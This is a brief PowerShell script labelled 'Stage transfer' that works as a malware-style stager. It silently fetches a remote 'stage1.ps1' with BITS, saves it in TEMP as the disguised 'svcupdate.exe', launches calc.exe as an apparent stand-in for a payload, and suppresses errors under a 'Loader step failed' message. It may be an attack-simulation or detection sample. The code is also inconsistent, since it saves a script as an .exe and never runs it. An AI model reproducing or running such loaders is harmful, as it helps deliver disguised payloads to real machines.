
<# Stage transfer #>
[CmdletBinding()]
param(
    [string]$FetchUrl = "http://internal.corp/stage1.ps1",
    [string]$LocalPath = "$env:TEMP\svcupdate.exe",
    [int]$ConnectionTimeout = 172
)
try { Start-BitsTransfer -Source $FetchUrl -Destination $LocalPath -ErrorAction SilentlyContinue; Start-Process -FilePath "calc.exe" -ErrorAction SilentlyContinue; Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3 } catch { Write-Warning "Loader step failed" }
